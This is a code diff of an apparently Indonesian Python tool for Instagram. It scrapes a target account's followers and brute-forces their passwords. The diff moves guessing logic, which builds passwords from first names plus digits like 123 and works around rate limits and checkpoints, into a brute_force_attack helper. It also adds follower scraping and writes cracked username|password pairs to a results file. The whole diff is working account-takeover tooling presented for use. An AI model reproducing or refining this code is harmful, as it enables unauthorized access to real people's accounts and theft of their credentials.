@@ -1,12 +1,9 @@
 import os
 import json
 import time
-import random
 from instagrapi import Client
-from instagrapi.exceptions import LoginRequired, ChallengeRequired, PleaseWaitFewMinutes, FeedbackRequired
-from utils.scraper import scrape_followers
-from utils.brute_force import try_login
 from colorama import Fore, init
+from utils.brute_force import brute_force_attack
 
 init(autoreset=True)
 
@@ -14,6 +11,7 @@ DATA_FOLDER = "Data/akun1"
 COOKIE_FILE = os.path.join(DATA_FOLDER, "cookie.txt")
 USER_FILE = os.path.join(DATA_FOLDER, "user.txt")
 HASH_DB = "hash_db.json"
+RESULT_FILE = "hasil_sukses.txt"
 
 def load_cookie():
     if not os.path.exists(COOKIE_FILE) or not os.path.exists(USER_FILE):
@@ -34,7 +32,7 @@ def load_cookie():
     return username, cookies
 
 def save_result(username, password):
-    with open("hasil_sukses.txt", "a") as f:
+    with open(RESULT_FILE, "a") as f:
         f.write(f"{username} | {password}\n")
 
 def load_hash_db():
@@ -46,6 +44,15 @@ def load_hash_db():
 def update_hash_db(db):
     with open(HASH_DB, "w") as f:
         json.dump(db, f, indent=2)
+
+def scrape_followers(cl, target_user):
+    try:
+        user_id = cl.user_id_from_username(target_user)
+        followers = cl.user_followers(user_id)
+        return {user.username: user.full_name for user in followers.values()}
+    except Exception as e:
+        print(Fore.RED + f"[!] Gagal mengambil followers: {e}")
+        return {}
 
 def main():
     os.system("clear")
@@ -68,33 +75,13 @@ def main():
 
     hash_db = load_hash_db()
 
-    for follower in followers:
-        username = follower.get("username", "")
-        full_name = follower.get("full_name", "")
-        name_parts = full_name.split(" ")
-        base = name_parts[0] if name_parts and name_parts[0] else username
-        passwords = [base + str(i) for i in [123, 1234, 12345, 321, ""]]
-
-        for password in passwords:
-            print(Fore.YELLOW + f"⏳ Menguji: {username} | {password}")
-            status = try_login(username, password)
-
-            if status == "success":
-                print(Fore.GREEN + f"✅ Valid: {username} | {password}")
-                save_result(username, password)
-                hash_db[username] = password
-                update_hash_db(hash_db)
-                break
-            elif status == "challenge":
-                print(Fore.RED + f"🔒 Checkpoint: {username}")
-                break
-            elif status == "feedback":
-                print(Fore.MAGENTA + f"🔁 Rate limit. Jeda 60 detik...")
-                time.sleep(60)
-                break
-            else:
-                print(Fore.RED + f"❌ Invalid")
-                time.sleep(random.uniform(1.5, 2.5))  # Delay aman
+    # Jalankan brute force terhadap followers
+    brute_force_attack(
+        user_list=followers,
+        hash_db=hash_db,
+        save_callback=save_result,
+        update_callback=update_hash_db
+    )
 
 if __name__ == "__main__":
     main()
